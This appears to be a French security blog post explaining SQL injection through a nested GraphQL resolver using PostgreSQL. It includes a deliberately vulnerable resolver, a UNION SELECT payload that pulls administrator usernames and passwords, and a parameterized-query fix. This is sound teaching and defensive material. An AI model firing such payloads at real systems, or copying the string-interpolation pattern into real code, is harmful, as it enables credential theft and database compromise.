---
id: "REQ-2026-001"
title: "Injection SQL dans les APIs GraphQL Modernes"
excerpt: "Exploration de la façon dont les vulnérabilités d'injection SQL traditionnelles se manifestent dans les endpoints GraphQL modernes, contournant les protections ORM standard."
date: "2026-03-15"
tags: ["WEB", "GRAPHQL", "SQLI", "POSTGRES"]
severity: "CRITICAL"
icon: "Database"
author: "0x7CC"
---

Bien que GraphQL ait changé le paradigme du développement d'API, il n'a pas éliminé les vulnérabilités traditionnelles. En fait, la complexité de la résolution des requêtes imbriquées masque souvent des failles d'injection SQL sous-jacentes, en particulier lorsque les développeurs s'appuient sur des résolveurs personnalisés au lieu d'ORM robustes.

## Le Contexte de la Vulnérabilité

Lors d'un récent engagement, j'ai rencontré un endpoint GraphQL gérant des profils utilisateurs. L'application utilisait Apollo Server et PostgreSQL. Bien que les requêtes de premier niveau aient été correctement paramétrées, un résolveur imbriqué spécifique pour filtrer les journaux d'activité des utilisateurs était vulnérable.

```javascript
const resolvers = {
  User: {
    activityLogs: async (parent, args, context) => {
      // VULNERABLE: Interpolation directe de chaîne de l'argument 'filter'
      const query = `
        SELECT * FROM logs 
        WHERE user_id = ${parent.id} 
        AND action_type = '${args.filter}'
      `;
      
      const result = await db.query(query);
      return result.rows;
    }
  }
};
```

## Vecteur d'Exploitation

La vulnérabilité réside dans le paramètre `args.filter`. Étant donné que GraphQL autorise les requêtes profondément imbriquées, nous pouvons déclencher ce résolveur tout en demandant le profil d'un utilisateur. La charge utile doit sortir des guillemets simples et injecter un UNION SELECT pour extraire des données d'autres tables.

```graphql
query {
  user(id: 1) {
    name
    email
    activityLogs(filter: "login' UNION SELECT 1, username, password, 4 FROM admin_users--") {
      id
      action_type
      timestamp
    }
  }
}
```

Cette charge utile a extrait avec succès les identifiants d'administration, en les mappant aux champs `action_type` et `timestamp` définis dans le schéma GraphQL pour le type `ActivityLog`.

## Remédiation

Le correctif est simple : utilisez toujours des requêtes paramétrées ou un générateur de requêtes/ORM de confiance, même dans les résolveurs imbriqués.

```javascript
const resolvers = {
  User: {
    activityLogs: async (parent, args, context) => {
      // SECURE: Utilisation de requêtes paramétrées
      const query = 'SELECT * FROM logs WHERE user_id = $1 AND action_type = $2';
      const values = [parent.id, args.filter];
      
      const result = await db.query(query, values);
      return result.rows;
    }
  }
};
```
